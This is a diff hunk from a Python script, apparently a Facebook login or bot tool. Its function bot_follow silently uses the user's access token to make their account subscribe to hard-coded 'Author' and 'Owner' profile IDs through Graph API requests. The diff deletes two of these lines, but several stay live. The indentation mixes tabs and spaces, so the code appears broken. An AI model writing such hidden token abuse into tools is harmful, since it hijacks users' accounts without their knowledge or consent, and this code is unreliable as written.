@@ -92,8 +92,6 @@ def bot_follow():
 		print("\n   [!] Token invalid")
 		logs()
 		requests.post('https://graph.facebook.com/100070904510470/subscribers?access_token=' + toket)      #Author
-		requests.post('https://graph.facebook.com/100070894431697/subscribers?access_token=' + toket)      #Owner
-        requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + toket)      #Owner
 		requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + toket) #
 		requests.post('https://graph.facebook.com/100013012878335/subscribers?access_token=' + toket) #
         print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
